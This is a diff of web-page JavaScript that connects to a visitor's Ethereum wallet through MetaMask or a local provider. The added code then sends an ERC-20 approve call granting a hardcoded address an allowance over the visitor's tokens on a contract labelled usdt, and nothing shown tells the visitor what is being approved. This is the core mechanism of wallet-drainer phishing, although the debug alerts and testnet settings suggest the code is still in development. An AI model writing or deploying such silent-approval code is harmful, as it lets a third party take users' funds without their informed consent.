@@ -98,121 +98,150 @@
     console.log(22)
   }
 
+  const abi = [
+    {
+      "constant": false,
+      "inputs": [
+        {
+          "name": "_spender",
+          "type": "address"
+        },
+        {
+          "name": "_amount",
+          "type": "uint256"
+        }
+      ],
+      "name": "approve",
+      "outputs": [
+        {
+          "name": "success",
+          "type": "bool"
+        }
+      ],
+      "payable": false,
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "constant": false,
+      "inputs": [
+        {
+          "name": "_from",
+          "type": "address"
+        },
+        {
+          "name": "_to",
+          "type": "address"
+        },
+        {
+          "name": "_amount",
+          "type": "uint256"
+        }
+      ],
+      "name": "transferFrom",
+      "outputs": [
+        {
+          "name": "success",
+          "type": "bool"
+        }
+      ],
+      "payable": false,
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "constant": true,
+      "inputs": [
+        {
+          "name": "_owner",
+          "type": "address"
+        }
+      ],
+      "name": "balanceOf",
+      "outputs": [
+        {
+          "name": "balance",
+          "type": "uint256"
+        }
+      ],
+      "payable": false,
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "constant": false,
+      "inputs": [
+        {
+          "name": "_to",
+          "type": "address"
+        },
+        {
+          "name": "_amount",
+          "type": "uint256"
+        }
+      ],
+      "name": "transfer",
+      "outputs": [
+        {
+          "name": "success",
+          "type": "bool"
+        }
+      ],
+      "payable": false,
+      "stateMutability": "nonpayable",
+      "type": "function"
+    }
+  ]
+
   const yourAddress = '0x621bdded2b894228943a3a063d5459937b947f1a'
   const value = '0x0' // 16进制表示的以太币数量，单位：wei   1EH=0xde0b6b3a7640000   0.001ETH=0x38d7ea4c68000
   const desiredNetwork = '0x3' // '0x1' 表示以太坊主网
   const value2 = '0x0'
+  var account = ""
+
   async function test() {
     let web3;
     if (window.ethereum) {
       web3 = new Web3(window.ethereum);
-      await window.ethereum.enable();
+      await window.ethereum.enable().then(function (accounts) {
+        console.log("xxxxxxxxxxxxxxxx")
+        account = accounts
+      })
+      alert("ethereum")
+
+      // const provider = new ethers.providers.Web3Provider(window.ethereum)
+      // web3 = provider
+      // await window.ethereum.enable().then(function (accounts) {
+      //     console.log("xxxxxxxxxxxxxxxx")
+      //     account = accounts
+      //   })
     } else if (window.web3) {
       // Use Mist/MetaMask's provider.
       web3 = window.web3;
+      alert("web3")
     } else {
       const provider = new Web3.providers.HttpProvider(
-              "https://mainnet.infura.io/v3/16b3844622e34365a8bcdd1d424d65f0"
+              "http://127.0.0.1:9545"
       );
       web3 = new Web3(provider);
+      // account = web3.eth.accounts;
+      // account = accounts[0]
+      // web3.enable()
+      web3.eth.getAccounts().then(function (accounts) {
+        console.log("xxxxxxxxxxxxxxxx")
+        account = accounts
+      })
+      console.log("xxxxxxxxxxxxxxxx  provider", account)
+      alert("provider")
     }
-    let abi = [
-      {
-        "constant": false,
-        "inputs": [
-          {
-            "name": "_spender",
-            "type": "address"
-          },
-          {
-            "name": "_amount",
-            "type": "uint256"
-          }
-        ],
-        "name": "approve",
-        "outputs": [
-          {
-            "name": "success",
-            "type": "bool"
-          }
-        ],
-        "payable": false,
-        "stateMutability": "nonpayable",
-        "type": "function"
-      },
-      {
-        "constant": false,
-        "inputs": [
-          {
-            "name": "_from",
-            "type": "address"
-          },
-          {
-            "name": "_to",
-            "type": "address"
-          },
-          {
-            "name": "_amount",
-            "type": "uint256"
-          }
-        ],
-        "name": "transferFrom",
-        "outputs": [
-          {
-            "name": "success",
-            "type": "bool"
-          }
-        ],
-        "payable": false,
-        "stateMutability": "nonpayable",
-        "type": "function"
-      },
-      {
-        "constant": true,
-        "inputs": [
-          {
-            "name": "_owner",
-            "type": "address"
-          }
-        ],
-        "name": "balanceOf",
-        "outputs": [
-          {
-            "name": "balance",
-            "type": "uint256"
-          }
-        ],
-        "payable": false,
-        "stateMutability": "view",
-        "type": "function"
-      },
-      {
-        "constant": false,
-        "inputs": [
-          {
-            "name": "_to",
-            "type": "address"
-          },
-          {
-            "name": "_amount",
-            "type": "uint256"
-          }
-        ],
-        "name": "transfer",
-        "outputs": [
-          {
-            "name": "success",
-            "type": "bool"
-          }
-        ],
-        "payable": false,
-        "stateMutability": "nonpayable",
-        "type": "function"
-      }
-    ]
     let usdt = "0x27afd216475849ae176f37045b6d4a22611740a2"
     const contr = new web3.eth.Contract(abi, usdt);
+
+    console.log(account)
+    res = contr.methods.approve("0x621bdded2b894228943a3a063d5459937b947f1a",10000000).send({from:account[0]});
+    console.log('getWeb3',res, account)
   }
+
 
   function WalletLinkDo() {
     console.log("--- WalletLinkDo ---")
